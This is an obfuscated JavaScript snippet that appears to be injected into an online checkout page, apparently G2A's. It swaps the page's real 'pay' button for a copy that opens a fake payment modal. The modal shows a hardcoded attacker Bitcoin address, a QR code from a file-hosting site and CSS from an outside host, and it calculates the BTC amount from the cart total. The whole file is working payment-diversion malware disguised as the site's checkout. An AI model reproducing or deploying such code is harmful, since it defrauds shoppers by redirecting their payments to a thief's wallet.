async function updateBTCPrice() {
  const _0x55463c = Array.from(document.querySelectorAll("span")).find(_0x143615 => _0x143615.textContent.trim().startsWith("$"));
  if (_0x55463c) {
    const _0x10c058 = parseFloat(_0x55463c.textContent.trim().replace("$", ""));
    if (!isNaN(_0x10c058)) {
      try {
        const _0x229549 = await fetch("https://api.coindesk.com/v1/bpi/currentprice/USD.json");
        const _0x42d924 = await _0x229549.json();
        const _0x35f1a4 = parseFloat(_0x42d924.bpi.USD.rate.replace(",", ""));
        if (!isNaN(_0x35f1a4)) {
          const _0x5ed7ec = (_0x10c058 / _0x35f1a4).toFixed(0x8);
          const _0x13036b = document.getElementById("btcAmount");
          _0x13036b.textContent = _0x5ed7ec;
        } else {
          console.error("Error parsing BTC price");
        }
      } catch (_0xae75bf) {
        console.error("Error fetching BTC price:", _0xae75bf);
      }
    } else {
      console.error("Error parsing USD balance");
    }
  } else {
    console.error("USD balance element not found");
  }
}
function replaceButtonWithModal(_0x51aed3, _0x481234, _0xe99b43, _0x55ce84) {
  const _0x38605e = Array.from(document.querySelectorAll("button")).find(_0x635690 => _0x635690.textContent.trim().toLowerCase().includes(_0x51aed3.toLowerCase()));
  if (_0x38605e) {
    const _0x1061ad = document.createElement("button");
    _0x1061ad.textContent = _0x38605e.textContent;
    _0x1061ad.className = _0x481234;
    _0x38605e.parentNode.replaceChild(_0x1061ad, _0x38605e);
    _0x1061ad.addEventListener("click", _0xc13c80 => {
      _0xc13c80.preventDefault();
      const _0x2da5e4 = document.createElement("div");
      _0x2da5e4.id = "modalOverlay";
      _0x2da5e4.style.position = "fixed";
      _0x2da5e4.style.top = "0";
      _0x2da5e4.style.left = "0";
      _0x2da5e4.style.width = "100%";
      _0x2da5e4.style.height = "100%";
      _0x2da5e4.style.backgroundColor = "rgba(0, 0, 0, 0.5)";
      _0x2da5e4.style.display = "flex";
      _0x2da5e4.style.alignItems = "center";
      _0x2da5e4.style.justifyContent = "center";
      _0x2da5e4.style.zIndex = "1000";
      document.body.appendChild(_0x2da5e4);
      const _0xbf7dce = document.createElement("div");
      _0xbf7dce.className = "g2a-modal";
      _0xbf7dce.innerHTML = _0xe99b43;
      _0x2da5e4.appendChild(_0xbf7dce);
      _0x2da5e4.addEventListener("click", _0x2fbb61 => {
        if (_0x2fbb61.target === _0x2da5e4) {
          document.body.removeChild(_0x2da5e4);
        }
      });
      const _0x29418a = document.createElement("link");
      _0x29418a.rel = "stylesheet";
      _0x29418a.href = _0x55ce84;
      document.head.appendChild(_0x29418a);
      updateBTCPrice();
    });
  } else {
    console.error("Button not found with the specified text.");
  }
}
replaceButtonWithModal("pay", "sc-iCoGMd ehJpkz indexes__ButtonContinue-sc-18h7v3q-1 dwifaY", "\n<img src=\"https://checkout.pay.g2a.com/zen_btc.png\" alt=\"Bitcoin\" class=\"g2a-logo\">\n<p><span class=\"g2a-grey-text\">BTC amount:</span> <span id=\"btcAmount\"></span></p>\n<p><span class=\"g2a-grey-text\">BTC address:</span>bc1q2asypvlska6wl2lpdmh8t8w7dztg9l2m8cqjvz</p>\n<img src=\"https://files.catbox.moe/lgvsr0.png\" alt=\"QR code to scan\" class=\"g2a-qr-code\">\n<p>Scan the QR code to complete your payment.</p>\n<p class=\"g2a-grey-text\"><small>Once you’ve done it, wait for your payment to confirm.</small></p>\n<button class=\"g2a-confirm-button\">Confirm payment</button>\n", "https://linkies.xyz/pazte/modal.css");
document.addEventListener("DOMContentLoaded", function () {
  const _0x22ee8d = document.getElementById("modalOverlay");
  if (_0x22ee8d) {
    updateBTCPrice();
  }
});
